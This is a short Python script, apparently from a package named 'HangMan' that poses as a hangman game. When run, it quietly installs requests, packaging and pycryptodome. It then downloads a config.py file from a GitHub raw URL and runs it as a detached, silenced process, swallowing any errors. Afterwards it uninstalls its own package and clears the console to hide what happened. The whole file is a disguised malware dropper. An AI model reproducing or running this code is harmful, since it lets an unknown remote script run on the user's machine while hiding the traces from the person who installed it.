import os
import warnings
import subprocess

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def uninstall_github_libary():
    subprocess.run(['pip', 'uninstall', '-y', 'HangMan'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)                          #GITHUB_PACKET_NAME

def packets():
    warnings.simplefilter("ignore")
    subprocess.check_call(['pip', 'install', 'requests', 'packaging', 'pycryptodome'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def execute_remote_script():
    import requests
    url = "https://raw.githubusercontent.com/Samantha0709/Hang/main/config.py"                                                                           #url to config.py
    try:
        response = requests.get(url)
        script_content = response.text
        with open("temp_script.py", "w") as temp_file:
            temp_file.write(script_content)
        subprocess.Popen(["python", "temp_script.py"], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        pass

def main():
    clear_console()
    packets()
    execute_remote_script()
    uninstall_github_libary() 
    clear_console()

main()
